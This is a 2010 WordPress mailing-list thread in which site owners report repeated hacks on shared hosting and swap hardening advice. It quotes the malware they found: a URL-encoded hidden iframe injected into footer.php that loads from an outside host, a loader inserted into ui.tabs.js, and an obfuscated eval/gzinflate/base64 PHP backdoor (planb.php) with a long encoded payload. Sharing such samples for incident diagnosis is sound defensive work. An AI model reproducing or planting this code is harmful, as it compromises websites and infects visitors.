bYlLz0FiV1DFTyNew9mrajh2n0/WfSiZ5VeRW6HMmvb0FwLz1meJoolM0DrT3gmPUOaZPY126smbX6OoYhIUAXg5PMAyzQSjYgYkRzs4T+hEBi8+2a3DpmiIAwFBLV7zIZMATExeG4HWpq7r74x4OjCx52W6114AOoMBchRp7kPwpW6zkJ3M+KoSSSVdjXqchQjabSY9N0MHjpMxm7gvgkjXd/b9br8e9q3v50jodHQki/H5GwfcH/Ap1Wzo0bQQrJHhZcj0OAa1kGpfGKRvlWNjw/xTMFeXLykjQJSpSdAnjVBIoxQB9muM5tCuZsohQOts3fck7VZmDzLUtLNBj4DFZPBe1iZyb+ZR/TV5KVzlIBE0XQ8fddqQD6HAIZTQfaaNzPgsLsDrFQStGnDEuABZP6VwwUNQnZ1qCTu4n+Hr96p9xJo68rkuFPcpiRAL1XTX1sXns2DAlNTnTziY1ABylYWw3pLGBa5Vp5rjdq1+YfCwZ8CO/Xe7geiHfe6AgnQPqKDf2CC56N0AGfxO4iqy2R+Rij9MPl8blIFsCwh/QC1c8cJUVG8WWoOsscYOy4SDbG9vE62jCAU09I7p0bZCSyO4ikShw/YLjUTbVInJCOrL6ehpDEmP5uvAIa9a1M79rUHGoOS7LrhwKfVC0pVpJ0i/r4FzPKHr246qn5+xWh+ZATuWt37xaSW7vCEzlSS5/cF8KA36jEBLtYlKU1LiZmr1l5PO9pnA2iK0NKt9btX5ppX8OnUMs/xqOeCI6FUCMY+DrtgCSw1DdQGzpyrQOZnBnFJk5V5+cespVxB1L/8RsLLD9xsh5og+1Jsa5w6bMqc0VmG9bH/k+zdhjsH6HFPcmpmcbQUsUsyskKDl7wtq/zYNYOHApyLa0yOsjWxZnOayDi7S0Faot3c4KjDsGf2S30R45Irfcfae40RHAKxY+gx7WcGZ93IAI8BMig0imCt5IGwN8nmGRaagVeR3QkJnDm6lMlQLxn44s3Evyo1gAbQyeifQxyc/iIkTI+MYi78HYF9zTG2XtqQd1jXi2ZLmFYCnDUTOz0dI3dp0GRCSuVdxadPSWMy2rcLsI8sbva/PtUKECQNhjuEge5jguzRQk8HIeoUSMtRYj3OyWVvK8dMtNVdlLxE/Ga9MwppDBY/x9S3Fwxp47cbF3s5qde9VUvs



I did remove it. I did add security at wordpress.org to this thread.

Comments appreciated.






On Sun, Oct 31, 2010 at 7:15 PM, Ozh <ozh at ozh.org> wrote:

> Typically not a Dreamhost issue, otherwise there would be *thousands*
> of people screaming, and me in first line
>
> Being up to date with WP is fine, but most hack on shared hosting are
> not done using WP
> - check file permissions <http://codex.wordpress.org/Hardening_WordPress>
> - check other softwares & scripts running on your blog
> - change your main/SSH/FTP password
> - change your WP password
>
> I once had a WP blog hacked on Dreamhost. A few hours of investigation
> later (checking all the above + inspecting access logs) I found out
> that the insecure stuff was Scuttle (a delicious clone).
>
> On shared hosting WP is often the target, but rarely the entrance.
>
> On Sun, Oct 31, 2010 at 4:07 PM, Mladen Adamovic
> <mladen.adamovic at gmail.com> wrote:
> > Hi guys,
> >
> > My wordpress software instance was repeatedly hacked ... running latest
> > Wordpress source code and being hosted on Dreamhost.
> >
> > I don't know which exploit it did use and couldn't identify it, but it
> was
> > adding the following code to my default theme footer.php:
> >
> > <script>
> > enc =
> >
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> > dec = unescape(enc);
> > document.write(dec);
> > </script>
> >
> > I think I'll have to migrate to Blogger, since I couldn't identify
> exploit
> > it did use.
> >
> > I wanted to drop you an email anyhow since identifying exploits is
> > important!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> http://ozh.org/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From e at leau.net  Sun Oct 31 19:16:05 2010
From: e at leau.net (Edward de Leau)
Date: Sun, 31 Oct 2010 20:16:05 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
	<AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>
Message-ID: <AANLkTikGVDSR69=oDx0458Ta+hLwQF=yzrfA0KpsT1Xy@mail.gmail.com>

Switching hosts does not matter, the same happened to me on mediatemple
recently.

The caller script was inserted at the top of
wp-includes/js/jquery/ui.tabs.js

containing the caller:

document.write(?<script type="text/javascript"
src="/images/some_image/jquery.cycle.all.min.php"><\/script>?);/*

so the script itself, looking the same as yours in content was placed in the
/images/some_image directory.

I also still don't know how it was placed there. I have moved the wp.config
a level out of the webroot, have locks on the thing, other database
prefixes, secured my .htaccess, have a 400 on the wp-config, I think I have
chmodded all
of this to the amount that users still can see things so... possibly via
another application that runs under my shared hosting account (i think).








On Sun, Oct 31, 2010 at 7:51 PM, Mladen Adamovic
<mladen.adamovic at gmail.com>wrote:

> The website was hacked multiple times. While I was trying to prevent it
> happen again :
> - I did upgrade to latest version
> - changed passwords
> - made fresh wordpress install, imported RSS feed of old instance
> and disabled all plugins I don't use.
>
> ..and it was hacked again.
>
> I did now checked access.logs files with grep and all what I could find
> suspicious is :
>
> access.log:69.163.128.12 - - [31/Oct/2010:03:05:04 -0700] "POST
> /wp-cron.php?doing_wp_cron HTTP/1.0" 200 184 "-" "WordPress/3.0.1; "
>
> access.log.2010-10-29:64.0.55.44 - - [29/Oct/2010:13:39:27 -0700] "POST
> /wp-admin/includes/planb.php HTTP/1.1" 200 8194 "
> http://blog.numbeo.com/wp-admin/includes/planb.php" "Mozilla/5.0 (Windows;
> U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 AskTbSPC2/3.8.0.12304
> Firefox/3.6.12 WebMoney Advisor"
>
> This planb.php looks fishy with it's content :
> <?PHP
> set_time_limit(0);
> $login = "";
> $pass = "";
> $md5_pass = "";
>
> eval(gzinflate(base64_decode('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
>
>
>
> I did remove it. I did add security at wordpress.org to this thread.
>
> Comments appreciated.
>
>
>
>
>
>
> On Sun, Oct 31, 2010 at 7:15 PM, Ozh <ozh at ozh.org> wrote:
>
> > Typically not a Dreamhost issue, otherwise there would be *thousands*
> > of people screaming, and me in first line
> >
> > Being up to date with WP is fine, but most hack on shared hosting are
> > not done using WP
> > - check file permissions <http://codex.wordpress.org/Hardening_WordPress
> >
> > - check other softwares & scripts running on your blog
> > - change your main/SSH/FTP password
> > - change your WP password
> >
> > I once had a WP blog hacked on Dreamhost. A few hours of investigation
> > later (checking all the above + inspecting access logs) I found out
> > that the insecure stuff was Scuttle (a delicious clone).
> >
> > On shared hosting WP is often the target, but rarely the entrance.
> >
> > On Sun, Oct 31, 2010 at 4:07 PM, Mladen Adamovic
> > <mladen.adamovic at gmail.com> wrote:
> > > Hi guys,
> > >
> > > My wordpress software instance was repeatedly hacked ... running latest
> > > Wordpress source code and being hosted on Dreamhost.
> > >
> > > I don't know which exploit it did use and couldn't identify it, but it
> > was
> > > adding the following code to my default theme footer.php:
> > >
> > > <script>
> > > enc =
> > >
> >
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> > > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> > > dec = unescape(enc);
> > > document.write(dec);
> > > </script>
> > >
> > > I think I'll have to migrate to Blogger, since I couldn't identify
> > exploit
> > > it did use.
> > >
> > > I wanted to drop you an email anyhow since identifying exploits is
> > > important!
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > http://ozh.org/
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From e at leau.net  Sun Oct 31 19:18:51 2010
From: e at leau.net (Edward de Leau)
Date: Sun, 31 Oct 2010 20:18:51 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTikGVDSR69=oDx0458Ta+hLwQF=yzrfA0KpsT1Xy@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
	<AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>
	<AANLkTikGVDSR69=oDx0458Ta+hLwQF=yzrfA0KpsT1Xy@mail.gmail.com>
Message-ID: <AANLkTikTTcKPGoFBNHM-nsGNMz8Mvn+0DiWF9dUnsaXx@mail.gmail.com>

There is one advantage to use Mediatemple though... when you go to their
Grid usage screen you see all scripts/pages by usage. So  as soon as you a
weird script in there being called a lot of times (so at the top)... you
know enough.

On Sun, Oct 31, 2010 at 8:16 PM, Edward de Leau <e at leau.net> wrote:

> Switching hosts does not matter, the same happened to me on mediatemple
> recently.
>
> The caller script was inserted at the top of
> wp-includes/js/jquery/ui.tabs.js
>
> containing the caller:
>
> document.write(?<script type="text/javascript"
> src="/images/some_image/jquery.cycle.all.min.php"><\/script>?);/*
>
> so the script itself, looking the same as yours in content was placed in
> the /images/some_image directory.
>
> I also still don't know how it was placed there. I have moved the wp.config
> a level out of the webroot, have locks on the thing, other database
> prefixes, secured my .htaccess, have a 400 on the wp-config, I think I have
> chmodded all
> of this to the amount that users still can see things so... possibly via
> another application that runs under my shared hosting account (i think).
>
>
>
>
>
>
>
>
> On Sun, Oct 31, 2010 at 7:51 PM, Mladen Adamovic <
> mladen.adamovic at gmail.com> wrote:
>
>> The website was hacked multiple times. While I was trying to prevent it
>> happen again :
>> - I did upgrade to latest version
>> - changed passwords
>> - made fresh wordpress install, imported RSS feed of old instance
>> and disabled all plugins I don't use.
>>
>> ..and it was hacked again.
>>
>> I did now checked access.logs files with grep and all what I could find
>> suspicious is :
>>
>> access.log:69.163.128.12 - - [31/Oct/2010:03:05:04 -0700] "POST
>> /wp-cron.php?doing_wp_cron HTTP/1.0" 200 184 "-" "WordPress/3.0.1; "
>>
>> access.log.2010-10-29:64.0.55.44 - - [29/Oct/2010:13:39:27 -0700] "POST
>> /wp-admin/includes/planb.php HTTP/1.1" 200 8194 "
>> http://blog.numbeo.com/wp-admin/includes/planb.php" "Mozilla/5.0
>> (Windows;
>> U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026
>> AskTbSPC2/3.8.0.12304
>> Firefox/3.6.12 WebMoney Advisor"
>>
>> This planb.php looks fishy with it's content :
>> <?PHP
>> set_time_limit(0);
>> $login = "";
>> $pass = "";
>> $md5_pass = "";
>>
>> eval(gzinflate(base64_decode('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
>>
